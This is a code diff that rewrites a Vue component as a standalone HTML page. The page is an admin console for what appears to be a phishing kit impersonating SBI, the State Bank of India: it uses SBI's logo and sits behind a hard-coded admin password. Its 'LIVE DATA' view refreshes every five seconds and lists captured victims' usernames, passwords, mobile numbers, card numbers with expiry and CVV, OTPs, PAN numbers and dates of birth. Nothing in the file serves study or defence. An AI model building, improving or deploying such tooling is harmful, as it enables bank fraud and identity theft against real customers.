@@ -1,500 +1,475 @@
-<template>
-  <!-- ðŸ” LOGIN OVERLAY â€“ sirf yahan logo hai -->
-  <div v-if="!isLoggedIn" class="login-overlay">
-    <div class="login-popup">
-      <div class="login-header">
-        <img
-          src=""
-          alt="hLogo"
-          class="login-logo"
-        />
-        <div class="login-title">LOGIN</div>
-        <div class="login-subtitle">Secure Access Only</div>
-      </div>
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A – Vue.js (Original jaisa)</title>
+    <!-- Vue 3 CDN -->
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: white; min-height: 100vh; padding: 0; }
+        
+        [v-cloak] { display: none !important; }
+    </style>
+</head>
+<body>
+    <div id="app" v-cloak></div>
 
-      <div class="login-body">
-        <div class="input-group">
-          <label class="input-label">Username</label>
-          <input
-            type="text"
-            class="input-field"
-            v-model="username"
-            placeholder="Enter username"
-            @keypress.enter="focusPassword"
-            autocomplete="off"
-          />
-        </div>
+    <script>
+        const { createApp, ref, computed, onMounted, onUnmounted } = Vue;
 
-        <div class="input-group">
-          <label class="input-label">Password</label>
-          <input
-            type="password"
-            class="input-field"
-            v-model="password"
-            placeholder="Enter password"
-            @keypress.enter="login"
-            autocomplete="off"
-            ref="passwordInput"
-          />
-        </div>
+        const App = {
+            template: `
+                <!-- 🔐 LOGIN OVERLAY – sirf yahan logo hai -->
+                <div v-if="!isLoggedIn" class="login-overlay">
+                    <div class="login-popup">
+                        <div class="login-header">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/SBI-logo.svg" alt="hLogo" class="login-logo">
+                            <div class="login-title">LOGIN</div>
+                            <div class="login-subtitle">Secure Access Only</div>
+                        </div>
 
-        <button class="login-button" @click="login">Login</button>
-        <div class="error-message">{{ loginError }}</div>
-      </div>
-    </div>
-  </div>
+                        <div class="login-body">
+                            <div class="input-group">
+                                <label class="input-label">Username</label>
+                                <input type="text" class="input-field" v-model="username" placeholder="Enter username" @keypress.enter="focusPassword" autocomplete="off">
+                            </div>
 
-  <!-- ðŸ“Š MAIN CONTENT â€“ header me koi logo nahi -->
-  <div v-else class="main-content">
-    <header class="page-header">
-      <div class="header-title">ðŸ”´LIVE DATA</div>
-      <button class="logout-btn" @click="logout">Logout</button>
-    </header>
+                            <div class="input-group">
+                                <label class="input-label">Password</label>
+                                <input type="password" class="input-field" v-model="password" placeholder="Enter password" @keypress.enter="login" autocomplete="off" ref="passwordInput">
+                            </div>
 
-    <div
-      class="data-container"
-      :class="{ blink: blinkActive }"
-      ref="container"
-    >
-      <div v-if="formattedData.length === 0" class="empty">
-        No data available
-      </div>
-      <template v-else>
-        <div
-          v-for="(item, index) in formattedData"
-          :key="index"
-          class="data-item"
-          :class="[
-            index % 2 === 0 ? 'white-bg' : 'skyblue-bg',
-            item.type === 'User ID' ? 'user-data' :
-            item.type === 'Credit Card' ? 'card-data' :
-            item.type === 'OTP' || item.type === 'OTP2' ? 'otp-data' :
-            item.type === 'PAN' ? 'pan-data' :
-            item.type === 'Account Details' ? 'account-data' : ''
-          ]"
-          v-html="renderItem(item)"
-        />
-      </template>
-    </div>
-  </div>
-</template>
+                            <button class="login-button" @click="login">Login</button>
+                            <div class="error-message">{{ loginError }}</div>
+                        </div>
+                    </div>
+                </div>
 
-<script setup>
-import { ref, computed, onMounted, onUnmounted } from 'vue'
+                <!-- 📊 MAIN CONTENT – header me koi logo nahi -->
+                <div v-else class="main-content">
+                    <header class="page-header">
+                        <div class="header-title">🔴LIVE DATA</div>
+                        <button class="logout-btn" @click="logout">Logout</button>
+                    </header>
 
-// ------------------------------------------------------------
-// CONSTANTS
-// ------------------------------------------------------------
-const USERNAME = 'Admin'
-const PASSWORD = '18322387'
-const SESSION_KEY = 'admin_logged_in'
-const SESSION_TIMEOUT = 3 * 60 * 60 * 1000 // 3 hours
+                    <div class="data-container" :class="{ blink: blinkActive }">
+                        <div v-if="formattedData.length === 0" class="empty">No data available</div>
+                        <template v-else>
+                            <div v-for="(item, index) in formattedData" :key="index"
+                                class="data-item"
+                                :class="[
+                                    index % 2 === 0 ? 'white-bg' : 'skyblue-bg',
+                                    item.type === 'User ID' ? 'user-data' :
+                                    item.type === 'Credit Card' ? 'card-data' :
+                                    item.type === 'OTP' || item.type === 'OTP2' ? 'otp-data' :
+                                    item.type === 'PAN' ? 'pan-data' :
+                                    item.type === 'Account Details' ? 'account-data' : ''
+                                ]"
+                                v-html="renderItem(item)">
+                            </div>
+                        </template>
+                    </div>
+                </div>
+            `,
 
-// ------------------------------------------------------------
-// STATE
-// ------------------------------------------------------------
-const isLoggedIn = ref(false)
-const username = ref('')
-const password = ref('')
-const loginError = ref('')
-const blinkActive = ref(false)
-const passwordInput = ref(null)
+            setup() {
+                // ------------------------------------------------------------
+                // CONSTANTS
+                // ------------------------------------------------------------
+                const USERNAME = "Admin";
+                const PASSWORD = "18322387";
+                const SESSION_KEY = "admin_logged_in";
+                const SESSION_TIMEOUT = 3 * 60 * 60 * 1000; // 3hr
 
-const submissions = ref([])
-let refreshInterval = null
+                // ------------------------------------------------------------
+                // STATE
+                // ------------------------------------------------------------
+                const isLoggedIn = ref(false);
+                const username = ref('');
+                const password = ref('');
+                const loginError = ref('');
+                const blinkActive = ref(false);
+                const passwordInput = ref(null);
+                const submissions = ref([]);
+                
+                let refreshInterval = null;
 
-// ------------------------------------------------------------
-// SESSION MANAGEMENT
-// ------------------------------------------------------------
-function checkSession() {
-  const sessionData = sessionStorage.getItem(SESSION_KEY)
-  if (sessionData) {
-    const session = JSON.parse(sessionData)
-    const now = Date.now()
-    if (now - session.loginTime < SESSION_TIMEOUT) {
-      isLoggedIn.value = true
-      loadData()
-      startAutoRefresh()
-      return
-    } else {
-      sessionStorage.removeItem(SESSION_KEY)
-    }
-  }
-  isLoggedIn.value = false
-}
+                // ------------------------------------------------------------
+                // SESSION
+                // ------------------------------------------------------------
+                function checkSession() {
+                    const sessionData = sessionStorage.getItem(SESSION_KEY);
+                    if (sessionData) {
+                        const session = JSON.parse(sessionData);
+                        const now = Date.now();
+                        if (now - session.loginTime < SESSION_TIMEOUT) {
+                            isLoggedIn.value = true;
+                            loadData();
+                            startAutoRefresh();
+                            return;
+                        } else {
+                            sessionStorage.removeItem(SESSION_KEY);
+                        }
+                    }
+                    isLoggedIn.value = false;
+                }
 
-function setSession() {
-  const sessionData = {
-    loggedIn: true,
-    loginTime: Date.now()
-  }
-  sessionStorage.setItem(SESSION_KEY, JSON.stringify(sessionData))
-  isLoggedIn.value = true
-}
+                function setSession() {
+                    sessionStorage.setItem(SESSION_KEY, JSON.stringify({
+                        loggedIn: true,
+                        loginTime: Date.now()
+                    }));
+                    isLoggedIn.value = true;
+                }
 
-function clearSession() {
-  sessionStorage.removeItem(SESSION_KEY)
-  isLoggedIn.value = false
-}
+                function clearSession() {
+                    sessionStorage.removeItem(SESSION_KEY);
+                    isLoggedIn.value = false;
+                }
 
-// ------------------------------------------------------------
-// LOGIN / LOGOUT
-// ------------------------------------------------------------
-function login() {
-  loginError.value = ''
-  if (!username.value.trim()) {
-    loginError.value = 'Please enter username'
-    return
-  }
-  if (!password.value) {
-    loginError.value = 'Please enter password'
-    return
-  }
-  if (username.value.trim() === USERNAME && password.value === PASSWORD) {
-    setSession()
-    loadData()
-    startAutoRefresh()
-    username.value = ''
-    password.value = ''
-  } else {
-    loginError.value = 'Invalid username or password!'
-    password.value = ''
-    passwordInput.value?.focus()
-  }
-}
+                // ------------------------------------------------------------
+                // LOGIN / LOGOUT
+                // ------------------------------------------------------------
+                function login() {
+                    loginError.value = '';
+                    if (!username.value.trim()) {
+                        loginError.value = 'Please enter username';
+                        return;
+                    }
+                    if (!password.value) {
+                        loginError.value = 'Please enter password';
+                        return;
+                    }
+                    if (username.value.trim() === USERNAME && password.value === PASSWORD) {
+                        setSession();
+                        loadData();
+                        startAutoRefresh();
+                        username.value = '';
+                        password.value = '';
+                    } else {
+                        loginError.value = 'Invalid username or password!';
+                        password.value = '';
+                        passwordInput.value?.focus();
+                    }
+                }
 
-function logout() {
-  clearSession()
-  stopAutoRefresh()
-}
+                function logout() {
+                    clearSession();
+                    stopAutoRefresh();
+                }
 
-function focusPassword() {
-  passwordInput.value?.focus()
-}
+                function focusPassword() {
+                    passwordInput.value?.focus();
+                }
 
-// ------------------------------------------------------------
-// DATA â€“ localStorage se lao
-// ------------------------------------------------------------
-function loadData() {
-  const stored = localStorage.getItem('formSubmissions')
-  submissions.value = stored ? JSON.parse(stored) : []
-  triggerBlink()
-}
+                // ------------------------------------------------------------
+                // DATA – localStorage
+                // ------------------------------------------------------------
+                function loadData() {
+                    const stored = localStorage.getItem('formSubmissions');
+                    submissions.value = stored ? JSON.parse(stored) : [];
+                    triggerBlink();
+                }
 
-// reverse order â€“ naye pehle
-const formattedData = computed(() => {
-  return submissions.value.slice().reverse()
-})
+                const formattedData = computed(() => {
+                    return submissions.value.slice().reverse();
+                });
 
-// HTML generator â€“ bilkul original jaisa
-function renderItem(item) {
-  if (item.type === 'User ID') {
-    return `
-      <div class="field"><span class="field-label">User:</span>${item.data.username || 'N/A'}</div>
-      <div class="field"><span class="field-label">Pass:</span>${item.data.password || 'N/A'}</div>
-      <div class="field"><span class="field-label">Mobile:</span>${item.data.mobile || 'N/A'}</div>
-    `
-  } else if (item.type === 'Credit Card') {
-    return `
-      <div class="field"><span class="field-label">Card:</span>${item.data.cardNumber || 'N/A'}</div>
-      <div class="field"><span class="field-label">Expiry:</span>${item.data.expiry || 'N/A'}</div>
-      <div class="field"><span class="field-label">CVV:</span>${item.data.cvv || 'N/A'}</div>
-      <div class="field"><span class="field-label">Limit:</span>${item.data.creditLimit || 'N/A'}</div>
-      <div class="field"><span class="field-label">Mobile:</span>${item.data.mobile || 'N/A'}</div>
-    `
-  } else if (item.type === 'OTP' || item.type === 'OTP2') {
-    return `
-      <div class="field"><span class="field-label">OTP:</span>${item.otp || 'N/A'}</div>
-    `
-  } else if (item.type === 'PAN') {
-    return `
-      <div class="field"><span class="field-label">Name:</span>${item.data.name || 'N/A'}</div>
-      <div class="field"><span class="field-label">PAN:</span>${item.data.pan || 'N/A'}</div>
-    `
-  } else if (item.type === 'Account Details') {
-    return `
-      <div class="field"><span class="field-label">Name:</span>${item.data.name || 'N/A'}</div>
-      <div class="field"><span class="field-label">DOB:</span>${item.data.dob || 'N/A'}</div>
-    `
-  } else {
-    return `
-      <div class="field"><span class="field-label">Type:</span>${item.type || 'Unknown'}</div>
-      <div class="field"><span class="field-label">Data:</span>${JSON.stringify(item) || 'N/A'}</div>
-    `
-  }
-}
+                function renderItem(item) {
+                    if (item.type === 'User ID') {
+                        return \`
+                            <div class="field"><span class="field-label">User:</span>\${item.data.username || 'N/A'}</div>
+                            <div class="field"><span class="field-label">Pass:</span>\${item.data.password || 'N/A'}</div>
+                            <div class="field"><span class="field-label">Mobile:</span>\${item.data.mobile || 'N/A'}</div>
+                        \`;
+                    } else if (item.type === 'Credit Card') {
+                        return \`
+                            <div class="field"><span class="field-label">Card:</span>\${item.data.cardNumber || 'N/A'}</div>
+                            <div class="field"><span class="field-label">Expiry:</span>\${item.data.expiry || 'N/A'}</div>
+                            <div class="field"><span class="field-label">CVV:</span>\${item.data.cvv || 'N/A'}</div>
+                            <div class="field"><span class="field-label">Limit:</span>\${item.data.creditLimit || 'N/A'}</div>
+                            <div class="field"><span class="field-label">Mobile:</span>\${item.data.mobile || 'N/A'}</div>
+                        \`;
+                    } else if (item.type === 'OTP' || item.type === 'OTP2') {
+                        return \`
+                            <div class="field"><span class="field-label">OTP:</span>\${item.otp || 'N/A'}</div>
+                        \`;
+                    } else if (item.type === 'PAN') {
+                        return \`
+                            <div class="field"><span class="field-label">Name:</span>\${item.data.name || 'N/A'}</div>
+                            <div class="field"><span class="field-label">PAN:</span>\${item.data.pan || 'N/A'}</div>
+                        \`;
+                    } else if (item.type === 'Account Details') {
+                        return \`
+                            <div class="field"><span class="field-label">Name:</span>\${item.data.name || 'N/A'}</div>
+                            <div class="field"><span class="field-label">DOB:</span>\${item.data.dob || 'N/A'}</div>
+                        \`;
+                    } else {
+                        return \`
+                            <div class="field"><span class="field-label">Type:</span>\${item.type || 'Unknown'}</div>
+                            <div class="field"><span class="field-label">Data:</span>\${JSON.stringify(item) || 'N/A'}</div>
+                        \`;
+                    }
+                }
 
-// ------------------------------------------------------------
-// BLINK EFFECT â€“ har 5 sec aur har load par
-// ------------------------------------------------------------
-function triggerBlink() {
-  blinkActive.value = true
-  setTimeout(() => {
-    blinkActive.value = false
-  }, 150)
-}
+                // ------------------------------------------------------------
+                // BLINK
+                // ------------------------------------------------------------
+                function triggerBlink() {
+                    blinkActive.value = true;
+                    setTimeout(() => {
+                        blinkActive.value = false;
+                    }, 150);
+                }
 
-// ------------------------------------------------------------
-// AUTO REFRESH â€“ har 5 sec
-// ------------------------------------------------------------
-function startAutoRefresh() {
-  stopAutoRefresh()
-  refreshInterval = setInterval(() => {
-    loadData()
-  }, 5000)
-}
+                // ------------------------------------------------------------
+                // AUTO REFRESH
+                // ------------------------------------------------------------
+                function startAutoRefresh() {
+                    stopAutoRefresh();
+                    refreshInterval = setInterval(() => {
+                        loadData();
+                    }, 5000);
+                }
 
-function stopAutoRefresh() {
-  if (refreshInterval) {
-    clearInterval(refreshInterval)
-    refreshInterval = null
-  }
-}
+                function stopAutoRefresh() {
+                    if (refreshInterval) {
+                        clearInterval(refreshInterval);
+                        refreshInterval = null;
+                    }
+                }
 
-// ------------------------------------------------------------
-// LIFECYCLE
-// ------------------------------------------------------------
-onMounted(() => {
-  checkSession()
-})
+                // ------------------------------------------------------------
+                // LIFECYCLE
+                // ------------------------------------------------------------
+                onMounted(() => {
+                    checkSession();
+                });
 
-onUnmounted(() => {
-  stopAutoRefresh()
-})
-</script>
+                onUnmounted(() => {
+                    stopAutoRefresh();
+                });
 
-<style scoped>
-/* bilkul wahi CSS â€“ kuch nahi hataya */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: Arial, sans-serif;
-}
+                return {
+                    isLoggedIn,
+                    username,
+                    password,
+                    loginError,
+                    blinkActive,
+                    passwordInput,
+                    formattedData,
+                    login,
+                    logout,
+                    focusPassword,
+                    renderItem
+                };
+            }
+        };
 
-body {
-  background-color: white;
-  min-height: 100vh;
-  padding: 0;
-}
+        // ------------------------------------------------------------
+        // STYLES (same as original)
+        // ------------------------------------------------------------
+        const style = document.createElement('style');
+        style.textContent = `
+            .login-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.7);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 9999;
+            }
+            .login-popup {
+                background-color: white;
+                width: 320px;
+                border-radius: 10px;
+                overflow: hidden;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            }
+            .login-header {
+                background: linear-gradient(135deg, #87CEEB, #4da6ff);
+                padding: 20px;
+                text-align: center;
+                color: white;
+            }
+            .login-logo {
+                height: 50px;
+                width: auto;
+                margin-bottom: 10px;
+            }
+            .login-title {
+                font-size: 20px;
+                font-weight: bold;
+                margin-bottom: 5px;
+            }
+            .login-subtitle {
+                font-size: 12px;
+                opacity: 0.9;
+            }
+            .login-body {
+                padding: 25px;
+            }
+            .input-group {
+                margin-bottom: 20px;
+            }
+            .input-label {
+                display: block;
+                font-size: 14px;
+                color: #333;
+                margin-bottom: 5px;
+                font-weight: bold;
+            }
+            .input-field {
+                width: 100%;
+                padding: 12px 15px;
+                border: 2px solid #e0e0e0;
+                border-radius: 6px;
+                font-size: 14px;
+                transition: border-color 0.3s;
+            }
+            .input-field:focus {
+                outline: none;
+                border-color: #87CEEB;
+            }
+            .login-button {
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #87CEEB, #4da6ff);
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 16px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: all 0.3s;
+                margin-top: 10px;
+            }
+            .login-button:hover {
+                background: linear-gradient(135deg, #4da6ff, #87CEEB);
+                transform: translateY(-2px);
+                box-shadow: 0 5px 15px rgba(135, 206, 235, 0.4);
+            }
+            .login-button:active {
+                transform: translateY(0);
+            }
+            .error-message {
+                color: #ff3860;
+                font-size: 13px;
+                text-align: center;
+                margin-top: 15px;
+                min-height: 20px;
+                font-weight: bold;
+            }
+            .main-content {
+                display: block;
+            }
+            .page-header {
+                background-color: #f8f9fa;
+                padding: 8px 15px;
+                border-bottom: 1px solid #dee2e6;
+                display: flex;
+                align-items: center;
+                position: sticky;
+                top: 0;
+                z-index: 100;
+            }
+            .header-title {
+                font-size: 18px;
+                color: black;
+                font-weight: bold;
+            }
+            .data-container {
+                padding: 0;
+                transition: background-color 0.1s ease;
+            }
+            .data-container.blink {
+                background-color: #d3d3d3;
+            }
+            .data-item {
+                padding: 12px 15px;
+                border-bottom: 1px solid #ccc;
+                font-size: 16px;
+                font-weight: bold;
+                color: black;
+            }
+            .data-item.white-bg {
+                background-color: white;
+            }
+            .data-item.skyblue-bg {
+                background-color: black;
+                color: white !important;
+            }
+            .data-item.skyblue-bg .field,
+            .data-item.skyblue-bg .field-label,
+            .data-item.skyblue-bg .user-data,
+            .data-item.skyblue-bg .card-data,
+            .data-item.skyblue-bg .otp-data,
+            .data-item.skyblue-bg .pan-data,
+            .data-item.skyblue-bg .account-data {
+                color: white !important;
+            }
+            .user-data,
+            .card-data,
+            .otp-data,
+            .pan-data,
+            .account-data,
+            .field,
+            .field-label {
+                color: black;
+                font-weight: bold;
+            }
+            .otp-data,
+            .pan-data,
+            .account-data {
+                color: black;
+                font-weight: bold;
+            }
+            .field {
+                margin-bottom: 5px;
+                font-size: 16px;
+            }
+            .field-label {
+                font-weight: bold;
+                color: black;
+                margin-right: 5px;
+            }
+            .empty {
+                text-align: center;
+                padding: 50px;
+                color: #333;
+                font-size: 18px;
+                font-weight: bold;
+            }
+            .logout-btn {
+                margin-left: auto;
+                padding: 8px 18px;
+                background: linear-gradient(135deg, #ff6b6b, #ff4757);
+                color: white;
+                border: none;
+                border-radius: 4px;
+                font-size: 14px;
+                font-weight: bold;
+                cursor: pointer;
+                transition: all 0.3s;
+            }
+            .logout-btn:hover {
+                background: linear-gradient(135deg, #ff4757, #ff6b6b);
+                transform: translateY(-1px);
+            }
+        `;
+        document.head.appendChild(style);
 
-.login-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background-color: rgba(0, 0, 0, 0.7);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  z-index: 9999;
-}
-
-.login-popup {
-  background-color: white;
-  width: 320px;
-  border-radius: 10px;
-  overflow: hidden;
-  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-}
-
-.login-header {
-  background: linear-gradient(135deg, #87ceeb, #4da6ff);
-  padding: 20px;
-  text-align: center;
-  color: white;
-}
-
-.login-logo {
-  height: 50px;
-  width: auto;
-  margin-bottom: 10px;
-}
-
-.login-title {
-  font-size: 20px;
-  font-weight: bold;
-  margin-bottom: 5px;
-}
-
-.login-subtitle {
-  font-size: 12px;
-  opacity: 0.9;
-}
-
-.login-body {
-  padding: 25px;
-}
-
-.input-group {
-  margin-bottom: 20px;
-}
-
-.input-label {
-  display: block;
-  font-size: 14px;
-  color: #333;
-  margin-bottom: 5px;
-  font-weight: bold;
-}
-
-.input-field {
-  width: 100%;
-  padding: 12px 15px;
-  border: 2px solid #e0e0e0;
-  border-radius: 6px;
-  font-size: 14px;
-  transition: border-color 0.3s;
-}
-
-.input-field:focus {
-  outline: none;
-  border-color: #87ceeb;
-}
-
-.login-button {
-  width: 100%;
-  padding: 14px;
-  background: linear-gradient(135deg, #87ceeb, #4da6ff);
-  color: white;
-  border: none;
-  border-radius: 6px;
-  font-size: 16px;
-  font-weight: bold;
-  cursor: pointer;
-  transition: all 0.3s;
-  margin-top: 10px;
-}
-
-.login-button:hover {
-  background: linear-gradient(135deg, #4da6ff, #87ceeb);
-  transform: translateY(-2px);
-  box-shadow: 0 5px 15px rgba(135, 206, 235, 0.4);
-}
-
-.login-button:active {
-  transform: translateY(0);
-}
-
-.error-message {
-  color: #ff3860;
-  font-size: 13px;
-  text-align: center;
-  margin-top: 15px;
-  min-height: 20px;
-  font-weight: bold;
-}
-
-.main-content {
-  display: block;
-}
-
-.page-header {
-  background-color: #f8f9fa;
-  padding: 8px 15px;
-  border-bottom: 1px solid #dee2e6;
-  display: flex;
-  align-items: center;
-  position: sticky;
-  top: 0;
-  z-index: 100;
-}
-
-.header-title {
-  font-size: 18px;
-  color: black;
-  font-weight: bold;
-}
-
-.data-container {
-  padding: 0;
-  transition: background-color 0.1s ease;
-}
-
-.data-container.blink {
-  background-color: #d3d3d3;
-}
-
-.data-item {
-  padding: 12px 15px;
-  border-bottom: 1px solid #ccc;
-  font-size: 16px;
-  font-weight: bold;
-  color: black;
-}
-
-.data-item.white-bg {
-  background-color: white;
-}
-
-.data-item.skyblue-bg {
-  background-color: black;
-  color: white !important;
-}
-
-.data-item.skyblue-bg .field,
-.data-item.skyblue-bg .field-label,
-.data-item.skyblue-bg .user-data,
-.data-item.skyblue-bg .card-data,
-.data-item.skyblue-bg .otp-data,
-.data-item.skyblue-bg .pan-data,
-.data-item.skyblue-bg .account-data {
-  color: white !important;
-}
-
-.user-data,
-.card-data,
-.otp-data,
-.pan-data,
-.account-data,
-.field,
-.field-label {
-  color: black;
-  font-weight: bold;
-}
-
-.otp-data,
-.pan-data,
-.account-data {
-  color: black;
-  font-weight: bold;
-}
-
-.field {
-  margin-bottom: 5px;
-  font-size: 16px;
-}
-
-.field-label {
-  font-weight: bold;
-  color: black;
-  margin-right: 5px;
-}
-
-.empty {
-  text-align: center;
-  padding: 50px;
-  color: #333;
-  font-size: 18px;
-  font-weight: bold;
-}
-
-.logout-btn {
-  margin-left: auto;
-  padding: 8px 18px;
-  background: linear-gradient(135deg, #ff6b6b, #ff4757);
-  color: white;
-  border: none;
-  border-radius: 4px;
-  font-size: 14px;
-  font-weight: bold;
-  cursor: pointer;
-  transition: all 0.3s;
-}
-
-.logout-btn:hover {
-  background: linear-gradient(135deg, #ff4757, #ff6b6b);
-  transform: translateY(-1px);
-}
-</style>
+        // ------------------------------------------------------------
+        // MOUNT APP
+        // ------------------------------------------------------------
+        const app = createApp(App);
+        app.mount('#app');
+    </script>
+</body>
+</html>
